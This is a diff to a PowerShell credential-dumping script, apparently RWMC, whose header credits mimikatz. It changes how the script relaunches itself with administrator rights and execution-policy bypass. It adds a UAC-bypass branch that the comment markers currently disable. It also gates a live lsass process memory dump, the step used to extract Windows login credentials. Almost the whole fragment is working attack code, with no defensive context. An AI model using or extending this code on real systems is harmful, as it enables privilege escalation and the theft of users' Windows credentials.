@@ -13,7 +13,12 @@
     Thanks to Benjamin Delpy for his work on mimikatz and Francesco Picasso (@dfirfpi) for his work on DES-X.
 
 #>
-
+Param
+    (
+        [Parameter(Position = 0)]        
+        [String]
+        $relaunched = 0
+    )
 #---------------------------------------------------------[Initialisations]--------------------------------------------------------
 Set-StrictMode -version Latest
 
@@ -38,6 +43,7 @@ $adFlag = 0
 $osArchitecture = ""
 $operatingSystem = ""
 $server = ""
+$elevate = 0
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
@@ -73,31 +79,23 @@ White-Rabbit
 # Prérequis
 Test-InternetConnection
 <#
-$remoteLocalFile = Read-Host 'Do you need to elvate your rights to local administrator ?
-1) Yes
-2) No
-0) Exit
-
-Enter menu number and press <ENTER>'
-
-switch ($remoteLocalFile){
-    "1" {Elevate-YourRightsMan}
-    "Yes" {Elevate-YourRightsMan}    
-    "Y" {Elevate-YourRightsMan}    
-    "0" {Stop-Script}    
-    default {Write-Output "The option could not be determined... no trying to elevate your right";}
-}
-#>
+if($relaunched -eq 0) {
+    if(!(Test-IsInLocalAdministratorsGroup)) {
+        $elevate = 1    
+        Bypass-UAC $scriptPath $logDirectoryPath
+    }
+    else {    #>
 $adminFlag = Test-LocalAdminRights
-
 if($adminFlag -eq $false){        
     Write-Host "You have to launch this script with " -nonewline; Write-Host "local Administrator rights!" -f Red    
-    $scriptPath = Split-Path $MyInvocation.InvocationName        
+    $scriptPath = Split-Path $MyInvocation.InvocationName   
+    $RWMC = $scriptPath + "\RWMC.ps1 1"     
     $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
     Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;    
     Stop-Script
-}
-
+}    
+    #}
+#}
 Write-Host "================================================================================================"
 $remoteLocalFile = Read-Host 'Do you want use Active Directory cmdlets ?
 1) Yes
@@ -229,8 +227,10 @@ if($dump -eq "gen"){
         &$dumpAProcessPath "lsass" "$logDirectoryPath"
     }
     else {
-        $process = Get-Process lsass 
-        Write-Minidump $process $logDirectoryPath                
+        if($elevate -eq 0) {
+            $process = Get-Process lsass 
+            Write-Minidump $process $logDirectoryPath                
+        }
     }
 }
 else {
